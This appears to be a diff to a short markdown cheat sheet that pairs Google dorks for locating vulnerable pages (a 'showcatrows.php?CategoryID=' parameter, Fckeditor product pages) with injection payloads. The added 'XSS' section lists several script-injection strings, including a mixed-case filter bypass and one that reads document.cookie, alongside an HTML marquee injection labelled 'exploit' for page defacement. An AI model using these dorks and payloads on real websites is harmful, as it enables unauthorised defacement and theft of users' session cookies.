@@ -1,15 +1,22 @@
-# Deface-page
-
-
-Dork : 
-
-notice: you google dork that direcotry :)
-
-# Fckeditor
+# XSS 
 
 inurl:"/showcatrows.php?CategoryID="
 
 exploit : "><marquee><h1>Your text</h1></mmarque>
+
+<script>alert("XSS")</script>
+
+"/><script>alert("XSS")</script>
+
+""/><script>alert("XSS")</script>
+
+"><script>alert("XSS")</script>
+
+<sCript>alert("XSS")</sCript>
+
+"><script>alert(document.cookie)</script>
+
+# Fckeditor
 
 inurl:"frame=product_detail"
 
